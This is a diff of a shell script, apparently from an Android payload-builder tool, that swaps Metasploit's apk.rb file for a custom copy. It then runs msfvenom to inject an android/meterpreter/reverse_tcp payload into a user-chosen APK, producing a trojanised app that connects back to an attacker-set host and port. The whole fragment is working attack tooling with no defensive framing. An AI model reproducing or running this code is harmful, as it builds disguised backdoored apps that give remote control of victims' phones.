@@ -30,6 +30,22 @@ read -p ">|" em
 
 if [ $em = "1" ]
 then
+###################
+## Modify apk.rb ##
+###################
+
+## Backup default apk.rb and copy custom apk.rb
+if [ -e $HOME/metasploit-framework/lib/msf/core/payload/apk.rb ]
+then
+mv $HOME/metasploit-framework/lib/msf/core/payload/apk.rb $HOME/metasploit-framework/lib/msf/core/payload/apk.rb.default.back
+cp $HOME/T-Load/.files/apk.rb $HOME/metasploit-framework/lib/msf/core/payload/apk.rb
+fi
+if [ -e $PREFIX/opt/metasploit-framework/lib/msf/core/payload/apk.rb ]
+then
+mv $PREFIX/opt/metasploit-framework/lib/msf/core/payload/apk.rb $PREFIX/opt/metasploit-framework/lib/msf/core/payload/apk.rb.default.back
+cp $HOME/T-Load/.files/apk.rb $PREFIX/opt/metasploit-framework/lib/msf/core/payload/apk.rb
+fi
+
 clear
 msfvenom -x $upath -p android/meterpreter/reverse_tcp LHOST=$vh LPORT=$vp -o $dpath
 echo ""
